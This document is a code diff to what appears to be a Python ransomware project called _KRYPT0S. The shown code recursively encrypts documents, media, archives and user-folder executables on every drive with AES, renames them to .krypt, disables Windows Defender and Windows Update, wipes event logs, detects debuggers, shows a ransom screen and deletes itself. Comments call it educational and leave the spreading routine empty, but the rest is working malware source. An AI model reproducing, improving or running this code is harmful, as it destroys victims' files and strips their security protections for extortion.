@@ -44,13 +44,23 @@ def initial_check_kill():
         except requests.ConnectionError:
             connect_counter += 1
 
-# Malware gets deleted from users file
-def kill_ransomware_file():
-    ransomware_file = os.path.abspath(__file__)
-    try:
-        os.remove(ransomware_file)
-    except:
-        sys.exit()
+# Attempt to delete _KRYPT0S
+def kill_ransomware_file(just_file_flag = 0):
+    file_to_del = [os.path.abspath(__file__), "Screen.exe", "wallpaperX324HF.png"]
+    
+    if just_file_flag == 0:
+        for file in file_to_del:
+            try:
+                os.remove(file)
+            except:
+                pass
+    else:
+        try:
+            os.remove(file_to_del[0]) # Just remove ransom program
+        except:
+            pass # A permission error most of the times
+
+    sys.exit()
 
 # A spreading mechanisim - WILL NOT BE IMPLEMENTED
 def spread():
@@ -72,10 +82,9 @@ def spread():
     # As this function is for educational purposes only, it does not implement any actual spreading mechanism.
     pass
 
-# Start up commands for CMD and Powershell to attempt to disable security services
+# Start up commands for CMD to attempt to disable security services (Mostly for admin or poor policy accounts)
 def startup_commands_windows():
     win_commands = [
-        "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
         "net stop WinDefend",
         "sc config WinDefend start= disabled",
         "net stop wuauserv",
@@ -102,7 +111,7 @@ def startup_commands_windows():
         if result.returncode != 0: 
             pass
 
-# Attempt to clear event logs after attack
+# Attempt to clear event logs after attack (Mostly for admin or poor policy accounts)
 def attempt_rem_event_logs():
     win_commands = [
         "wevtutil cl System",
@@ -127,12 +136,12 @@ def attempt_rem_event_logs():
             pass
 
 # Gather all drives used inside system
-def gather_all_drives():
+def list_drives():
     drives = win32api.GetLogicalDriveStrings()
     drives = drives.split('\000')[:-1]
     
-    if len(drives) == 0:
-        sys.exit()
+    if not drives:
+        drives = ["C:\\"] # Since C: drive is a universal drive
         
     return drives
 
@@ -142,29 +151,54 @@ def launch_gui():
         path = os.path.join(os.getcwd(), "Screen.exe")
         subprocess.Popen([path])
     except:
-        sys.exit() # Exit if an error occured when running the above file
+        pass # Ignore if cannot launch for some reason
 
 # Generate temporary AES symetric key
 def generate_key():
     return get_random_bytes(32)
 
-# Encyrpt and corrupt file chosen
-def encrypt_file(file_path, key):
+# Encrypt and corrupt file chosen
+def encrypt_file(file_path, key, size_threshold):
     try:
-        with open(file_path, "rb") as file:
-            file_content = file.read()   
-            
-        cipher = AES.new(key, AES.MODE_CBC)
-        iv = cipher.iv
-        encrypted_data = iv + cipher.encrypt(pad(file_content, AES.block_size))
-        
-        with open(file_path, 'wb') as file:
-            file.write(encrypted_data)
-            
+        file_size = os.path.getsize(file_path)
+        file_chunk = file_size // 4
+    except:
+        file_size = None  # Default Value
+
+    try:
+        if file_size and file_size > size_threshold:
+            with open(file_path, "rb") as file:
+                # Read file header
+                file_header = file.read(file_chunk)
+
+                # Read file footer
+                file.seek(-file_chunk, os.SEEK_END)
+                file_footer = file.read(file_chunk)
+        else:
+            # Read entire content
+            with open(file_path, "rb") as file:
+                file_content = file.read()
+
+        if file_size and file_size > size_threshold:
+            encrypted_data_header = process_data(key, file_header)
+            encrypted_data_footer = process_data(key, file_footer)
+        else:
+            encrypted_data = process_data(key, file_content)
+
+        if file_size and file_size > size_threshold:
+            with open(file_path, "r+b") as file:
+                file.seek(0)
+                file.write(encrypted_data_header)
+                file.seek(-file_chunk, os.SEEK_END)
+                file.write(encrypted_data_footer)
+        else:
+            with open(file_path, 'wb') as file:
+                file.write(encrypted_data)
+
         rename_file_with_counter(file_path, '.krypt')
     except PermissionError:
         try:
-            rename_file_with_counter(file_path, '.krypt') # Just rename
+            rename_file_with_counter(file_path, '.krypt')
         except PermissionError:
             pass
     except:
@@ -186,16 +220,6 @@ def rename_file_with_counter(file_path, new_extension):
                 break
             file_counter += 1
 
-# List all drives that the OS has (windows related)
-def list_drives():
-    drives = win32api.GetLogicalDriveStrings()
-    drives = drives.split('\000')[:-1]
-    
-    if len(drives) == 0:
-        sys.exit()
-    
-    return drives
-
 def enumerate_username():
     try:
         username = os.getlogin() # Get username
@@ -215,7 +239,8 @@ def enumerate_username():
     return username
 
 # Function to handle the traversal of files and encyrption, files searched for contain critical file extensions
-def traverse_encrypt(drive, key):        
+def traverse_encrypt(drive, key): 
+    size_threshold = 20971520      
     extensions = (
         '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt', '.png', '.jpg', 
         '.jpeg', '.bmp', '.gif', '.mp3', '.wav', '.mp4', '.mov', '.zip', '.rar', '.7z', 
@@ -245,31 +270,26 @@ def traverse_encrypt(drive, key):
             os.path.join(drive, f"Users\\{username}\\AppData\\Local\\Temp"),
         ]
         return main_dirs
-        
+    
     for root, _, files in os.walk(drive):
         # Get username for each drive
         username = enumerate_username()
+        # Generate .exe path for each drive
+        main_dirs = get_main_dirs(username, drive)
         
         for file in files:
-            # Skip custom wallpaper
-            if "wallpaperX324HF.png" in file:
+            # Skip KRYPT0S files
+            if file == "Screen.exe" or file == os.path.basename(__file__) or file == "wallpaperX324HF.png":
                 continue    
             
-            if not username:
-                continue
-            else:
-                if file.endswith('.exe'):
-                    main_dirs = get_main_dirs(username, drive)
-                    if any(root.startswith(main_dir) for main_dir in main_dirs):
-                        if file == "Screen.exe" or file == os.path.basename(__file__):
-                            # Skip to prevent self corruption
-                            continue
-                        else:
-                            # Will encyrpt .exe files featured in the general PC files to prevent system corruption
-                            encrypt_file(os.path.join(root, file), key)
-            
+            # Encrypt files that match the extensions saved
             if any(file.endswith(ext) for ext in extensions):
-                encrypt_file(os.path.join(root, file), key)
+                encrypt_file(os.path.join(root, file), key, size_threshold)
+            
+            # Encyrpt files with the .exe extension
+            if file.endswith('.exe') and username:
+                if any(root.startswith(main_dir) for main_dir in main_dirs):
+                    encrypt_file(os.path.join(root, file), key, size_threshold)
         
 # With threading, attept to traverse and encrypt the found files, use system cores to speed up the process
 def parallel_search(drives, key):
@@ -277,6 +297,13 @@ def parallel_search(drives, key):
         futures = [executor.submit(traverse_encrypt, drive, key) for drive in drives]
         for future in futures:
             future.result()
+
+def process_data(key, file_content):
+    cipher = AES.new(key, AES.MODE_CBC)
+    iv = cipher.iv
+    encrypted_data = iv + cipher.encrypt(pad(file_content, AES.block_size))
+    
+    return encrypted_data
 
 def check_debugging_and_virtualization():
     # Detect debugging
@@ -294,6 +321,9 @@ def check_debugging_and_virtualization():
         pass
 
     if debugging or virtualization:
+        # Destroy file and all its contents
+        kill_ransomware_file()
+
         # Exit if debugging or virtualization detected
         sys.exit() 
 
@@ -309,18 +339,15 @@ def zero_memory(buffer):
 
 # Attempt to move generated key out of memory
 def key_to_ram(key):
-    # Create an anonymous mmap for the key and write the key into it
     key_len = len(key)
     mm = mmap.mmap(-1, key_len, access=mmap.ACCESS_WRITE)
     mm.write(key)
-
-    # Lock the memory to prevent swapping
     kernel32 = ctypes.windll.kernel32
     kernel32.VirtualLock(ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(mm))), ctypes.c_size_t(key_len))
-
+    
     return mm, key_len, kernel32
 
-# Change the wallpaper of the user to indicate an attack (not tested!)
+# Change the wallpaper of the user to indicate an attack
 def change_windows_wallpaper():
     wallpaper_path = os.path.join(os.getcwd(), 'wallpaperX324HF.png')
     SPI_SETDESKWALLPAPER = 0x0014
@@ -349,35 +376,38 @@ def zero_and_unlock(mm, key_len, kernel_memory):
 
 # Main part, run all functions
 def main():
-    # Check if the machine is running in a debugging environment or a virtual machine.
-    # This is commonly done by real-life malware to evade analysis in sandboxes or virtualized environments.
     # Since running on a sandbox is the only usage for this ransomware, I commented the function call out.
-    
     # check_debugging_and_virtualization()
     
     # Start up commands and kill switch check
     initial_check_kill()
     startup_commands_windows()
     
-    # Key generation and encyrption
+    # Key generation and drive enumeration
     key = generate_key()
     mm, key_len, kernel_memory = key_to_ram(key)
-    drives = list_drives()
+    drives = list_drives()  
+    
+    # Start the attack
     parallel_search(drives, mm[:key_len])
+
+    # In a real life attack, this function would exist and propogate 
+    spread() # See function body for comment of ideas
     
-    # In a real life attack, this function would exist and propogate
-    spread()
-    
-    # Clean up and display screen
+    # Clean up tracks
     zero_and_unlock(mm, key_len, kernel_memory)
+    zero_memory(key)
     attempt_rem_event_logs()
     
     # Change wallpaper and show ransom screen
     change_windows_wallpaper()
     launch_gui() 
 
+    # Destroy ransomware file (Still keeping the ransomware screen and others)
+    kill_ransomware_file(1)
+
 if __name__ == "__main__":    
-    main() # Launch _KRYPT0s
+    main() # Launch _KRYPT0S
 
 # I AM NOT RESPONSIBLE FOR ANY MISDOINGS
 # 
